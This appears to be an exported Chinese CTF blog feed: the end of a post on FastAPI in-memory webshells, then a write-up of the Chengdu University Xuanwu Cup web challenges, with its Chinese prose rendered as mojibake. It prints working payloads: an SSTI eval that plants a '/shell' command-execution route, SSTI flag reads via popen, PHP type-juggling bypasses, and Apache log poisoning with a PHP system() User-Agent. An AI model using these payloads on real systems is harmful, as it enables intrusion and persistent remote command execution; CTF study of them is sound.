<span class="type">Optional</span>[<span class="type">List</span>[<span class="type">Union</span>[<span class="built_in">str</span>, Enum]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    dependencies: <span class="type">Optional</span>[<span class="type">Sequence</span>[params.Depends]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    summary: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    description: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_description: <span class="built_in">str</span> = <span class="string">&quot;Successful Response&quot;</span>,</span></span><br><span class="line"><span class="params">    responses: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">str</span>], <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    deprecated: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    methods: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="type">Set</span>[<span class="built_in">str</span>], <span class="type">List</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    operation_id: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_include: <span class="type">Optional</span>[IncEx] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude: <span class="type">Optional</span>[IncEx] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_by_alias: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_unset: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_defaults: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_none: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    include_in_schema: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    response_class: <span class="type">Union</span>[<span class="type">Type</span>[Response], DefaultPlaceholder] = Default(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="params">        JSONResponse</span></span></span><br><span class="line"><span class="params"><span class="params">    </span>),</span></span><br><span class="line"><span class="params">    name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    route_class_override: <span class="type">Optional</span>[<span class="type">Type</span>[APIRoute]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    callbacks: <span class="type">Optional</span>[<span class="type">List</span>[BaseRoute]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    openapi_extra: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    generate_unique_id_function: <span class="type">Union</span>[</span></span><br><span class="line"><span class="params">        <span class="type">Callable</span>[[APIRoute], <span class="built_in">str</span>], DefaultPlaceholder</span></span><br><span class="line"><span class="params">    ] = Default(<span class="params">generate_unique_id</span>),</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    route_class = route_class_override <span class="keyword">or</span> <span class="variable language_">self</span>.route_class</span><br><span class="line">    responses = responses <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    combined_responses = &#123;**<span class="variable language_">self</span>.responses, **responses&#125;</span><br><span class="line">    current_response_class = get_value_or_default(</span><br><span class="line">        response_class, <span class="variable language_">self</span>.default_response_class</span><br><span class="line">    )</span><br><span class="line">    current_tags = <span class="variable language_">self</span>.tags.copy()</span><br><span class="line">    <span class="keyword">if</span> tags:</span><br><span class="line">        current_tags.extend(tags)</span><br><span class="line">    current_dependencies = <span class="variable language_">self</span>.dependencies.copy()</span><br><span class="line">    <span class="keyword">if</span> dependencies:</span><br><span class="line">        current_dependencies.extend(dependencies)</span><br><span class="line">    current_callbacks = <span class="variable language_">self</span>.callbacks.copy()</span><br><span class="line">    <span class="keyword">if</span> callbacks:</span><br><span class="line">        current_callbacks.extend(callbacks)</span><br><span class="line">    current_generate_unique_id = get_value_or_default(</span><br><span class="line">        generate_unique_id_function, <span class="variable language_">self</span>.generate_unique_id_function</span><br><span class="line">    )</span><br><span class="line">    route = route_class(</span><br><span class="line">        <span class="variable language_">self</span>.prefix + path,</span><br><span class="line">        endpoint=endpoint,</span><br><span class="line">        response_model=response_model,</span><br><span class="line">        status_code=status_code,</span><br><span class="line">        tags=current_tags,</span><br><span class="line">        dependencies=current_dependencies,</span><br><span class="line">        summary=summary,</span><br><span class="line">        description=description,</span><br><span class="line">        response_description=response_description,</span><br><span class="line">        responses=combined_responses,</span><br><span class="line">        deprecated=deprecated <span class="keyword">or</span> <span class="variable language_">self</span>.deprecated,</span><br><span class="line">        methods=methods,</span><br><span class="line">        operation_id=operation_id,</span><br><span class="line">        response_model_include=response_model_include,</span><br><span class="line">        response_model_exclude=response_model_exclude,</span><br><span class="line">        response_model_by_alias=response_model_by_alias,</span><br><span class="line">        response_model_exclude_unset=response_model_exclude_unset,</span><br><span class="line">        response_model_exclude_defaults=response_model_exclude_defaults,</span><br><span class="line">        response_model_exclude_none=response_model_exclude_none,</span><br><span class="line">        include_in_schema=include_in_schema <span class="keyword">and</span> <span class="variable language_">self</span>.include_in_schema,</span><br><span class="line">        response_class=current_response_class,</span><br><span class="line">        name=name,</span><br><span class="line">        dependency_overrides_provider=<span class="variable language_">self</span>.dependency_overrides_provider,</span><br><span class="line">        callbacks=current_callbacks,</span><br><span class="line">        openapi_extra=openapi_extra,</span><br><span class="line">        generate_unique_id_function=current_generate_unique_id,</span><br><span class="line">    )</span><br><span class="line">    <span class="variable language_">self</span>.routes.append(route)</span><br></pre></td></tr></table></figure><p>ä¸ç”¨å…¨éƒ¨çœ‹æ‡‚ï¼Œåªéœ€è¦çŸ¥é“è¿™ä¸ª<code>add_api_route</code>å¯ä»¥ç”¨æ¥æ·»åŠ è·¯ç”±å°±å¥½äº†ï¼æ„é€ payload</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;sys.modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].<span class="built_in">_</span><span class="built_in">_</span>dict<span class="built_in">_</span><span class="built_in">_</span>[&#x27;app&#x27;].router.add<span class="built_in">_</span>api<span class="built_in">_</span>route(&#x27;/shell&#x27;,lambda cmd=&#x27;whoami&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(cmd).read(),methods=[&#x27;GET&#x27;])&quot;)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¥½äº†ï¼æˆ‘æµ‹è¿‡æ‰“é€šäº†ï¼</p><p><del>æœªå®Œå¾…ç»­</del></p>]]></content>
      
      
      <categories>
          
          <category> pythonå†…å­˜é©¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…å­˜é©¬ </tag>
            
            <tag> fastapi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆéƒ½å¤§å­¦ç¬¬å…«å±Šç„æ­¦æ¯ï¼ˆakï¼‰</title>
      <link href="/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"/>
      <url>/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="é”¦å®¶æœ‰ä»€ä¹ˆ"><a href="#é”¦å®¶æœ‰ä»€ä¹ˆ" class="headerlink" title="é”¦å®¶æœ‰ä»€ä¹ˆ"></a>é”¦å®¶æœ‰ä»€ä¹ˆ</h2><p>æŸ¥çœ‹æºç å‘ç°&#x2F;try_a_try</p><p><img src="/images/achieve/2025/11/1.png"></p><p>ç›´æ¥çŒœå‚æ•°æ˜¯nameæœçœŸï¼æœç„¶ä¹Ÿæ˜¯sstiç›´æ¥ç§’äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try<span class="built_in">_</span>a<span class="built_in">_</span>try?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;tac /f*&#x27;).read()&#125;&#125;</span><br><span class="line">NSSCTF&#123;191c23bd-63f0-4383-8719-15471a3e78e8&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><p>è¿™é¢˜å°±ä¸åˆ†æä»£ç äº†ï¼Œ?page&#x3D;&#x2F;flagå°±ç›´æ¥ç§’äº†ï¼æœ‰ä¸ªåŠ å¼ºç‰ˆçš„ï¼Œå¾…ä¼šç›´æ¥å°±åœ¨é‚£é¢˜åˆ†æä»£ç äº†ï¼</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;216a17fb-19f6-49e7-863b-bd0eb63d86b7&#125;</span><br></pre></td></tr></table></figure><h2 id="normal-php"><a href="#normal-php" class="headerlink" title="normal_php"></a>normal_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>]!==<span class="variable">$c</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="variable">$num1</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$num2</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">10520</span>,<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è®°ä½è¿™ä¸ªæ•°&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿™éƒ½è®°ä¸ä½?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num2</span>==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æˆ‘ä¸æƒ³è¦è¿™ä¸ªæ•°å­—!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³åå…­è¿›åˆ¶ç»•è¿‡?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$num2</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³å…«è¿›åˆ¶ç»•è¿‡?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span>,<span class="number">0</span>)==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å¥½äº†ä½ å¯ä»¥å»ä¸‹ä¸€å…³äº†&quot;</span>.<span class="variable">$next</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ç°åœ¨åˆæƒ³è¦äº†,å˜»å˜»&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¸er,md5ä½ ä¸ä¼š&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä½ çœ‹çœ‹ä¼ ä»€ä¹ˆå‘¢&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str($a,$b);</code>å°†å­—ç¬¦ä¸²$aè§£ææˆæ•°ç»„å­˜å…¥$b</p><p><code>if(strpos($num2, &quot;0&quot;))</code>0åœ¨ç¬¬ä¸€ä½è¿”å›çš„å°±æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥8è¿›åˆ¶ç»•è¿‡</p><p>payloadï¼ˆ&amp;è¦urlç¼–ç ä¸ç„¶å°±ä¼šè¢«è®¤ä¸ºæ˜¯å‚æ•°åˆ†å‰²ç¬¦ï¼‰</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=cdusec=QNKCDZO<span class="comment">%26num[]=10520%26num[]=0337522</span></span><br><span class="line">post:</span><br><span class="line">c=240610708</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³&#x2F;leeevvvel2222222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flagåœ¨/flagä¸­ï¼Œè¯•ç€è¯»è¯»?</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|filter|base64|text|read|resource|\=|\&#x27;|\&quot;|\,/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ªåè®®éƒ½ç”¨ä¸äº†æœ‰wafï¼Œé‚£å°±æ—¥å¿—åŒ…å«ï¼ŒapacheæœåŠ¡å™¨</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache/access.logä¹‹å‰ä¸€ç›´ä»¥ä¸ºæ˜¯è¿™ä¸ªï¼Œä½†æ˜¯æŸ¥äº†ä¸€ä¸‹ç°åœ¨ä¸æ˜¯äº†</span><br><span class="line">/var/log/apache2/access.logæ˜¯è¿™ä¸ªï¼Œç›´æ¥æ‰“å°±è¡Œäº†</span><br><span class="line">curl -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; &quot;http://node10.anna.nssctf.cn:22383/leeevvvel2222222.php&quot;</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;4c29beda-b185-46bc-9fb2-efccf4b193b9&#125;</span><br></pre></td></tr></table></figure><h2 id="çœ¼è§ä¸ä¸€å®šä¸ºå®"><a href="#çœ¼è§ä¸ä¸€å®šä¸ºå®" class="headerlink" title="çœ¼è§ä¸ä¸€å®šä¸ºå®"></a>çœ¼è§ä¸ä¸€å®šä¸ºå®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/secret&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NSSCTF&#123;default&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®403ç¦æ­¢çœ‹ä¸‹é¢˜ç›®</p><p><img src="/images/achieve/2025/11/2.png"></p><p>Nginx å’Œ Python å¯¹ URL è·¯å¾„çš„è§£ææ–¹å¼å¯èƒ½ä¸åŒï¼Œæ„æ€å°±æ˜¯è®©æˆ‘ä»¬å¼„ä¸ªè·¯å¾„Nginxä¸èƒ½è§£ææˆ&#x2F;secretï¼Œä½†æ˜¯pythonå¯ä»¥è§£ææˆ&#x2F;secret</p><p>ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹è¿˜çœŸæœ‰<a href="https://xz.aliyun.com/news/18629">Nginx è·¯å¾„ç»•è¿‡-å…ˆçŸ¥ç¤¾åŒº</a></p><p>nginx.config</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server<span class="built_in">_</span>name  localhost;</span><br><span class="line"></span><br><span class="line">    location ~* <span class="built_in">^</span>/secret/?<span class="built_in">$</span> &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~* <span class="built_in">^</span>/secret/ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy<span class="built_in">_</span>pass http://127.0.0.1:8080;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header Host <span class="built_in">$</span>host;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Real-IP <span class="built_in">$</span>remote<span class="built_in">_</span>addr;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Forwarded-For <span class="built_in">$</span>proxy<span class="built_in">_</span>add<span class="built_in">_</span>x<span class="built_in">_</span>forwarded<span class="built_in">_</span>for;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Forwarded-Proto <span class="built_in">$</span>scheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nginx é…ç½®çš„æ ¸å¿ƒè®¿é—®æ§åˆ¶éƒ¨åˆ†ï¼Œæˆ‘ä»¬çœ‹çœ‹å®ƒæ˜¯æ€ä¹ˆå¤„ç†çš„å¯ä»¥çœ‹åˆ°å®ƒç”¨æ­£åˆ™åŒ¹é…äº†æ‰€æœ‰çš„&#x2F;secretåé¢åŠ æˆ–è€…ä¸åŠ ä»»ä½•ä¸œè¥¿ï¼Œä½†æ˜¯ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦åŒ¹é…ä¸åˆ°ï¼Œæ¯”å¦‚ä¸å¯è§å­—ç¬¦\x85</p><p><img src="/images/achieve/2025/11/3.png"></p><p>æ”¹æˆ85å‘åŒ…å³å¯ï¼</p><h2 id="ez-file"><a href="#ez-file" class="headerlink" title="ez_file"></a>ez_file</h2><p>å¼€å±€å°±ç™»å½•é¡µé¢ï¼Œæ‰«å‡ºä¸ª&#x2F;<a href="http://www.zip/">www.zip</a></p><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#æ‚„æ‚„çš„ï¼Œæ ¡å†…èµ›é“ç¬¬ä¸€ä¸ªæ‰¾åˆ°å­¦é•¿çš„ç§˜å¯†çš„ç§ä¿¡å­¦é•¿ç§˜å¯†å†…å®¹ç»™å¥¶èŒ¶å–</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#header(&#x27;Content-Type: application/json&#x27;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$params</span> = [];</span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line"><span class="variable">$admin_role</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] , <span class="string">&quot;application/json&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$raw</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid JSON&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¦‚æœæ˜¯æ™®é€šè¡¨å•è¯·æ±‚</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ;</span><br><span class="line"><span class="comment">//    $params = [&#x27;username&#x27; =&gt; $username, &#x27;password&#x27; =&gt; $password];</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Unsupported request method&quot;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;456789&quot;</span> &amp;&amp; <span class="variable">$client_ip</span> === <span class="string">&quot;127.0.0.1&quot;</span>) 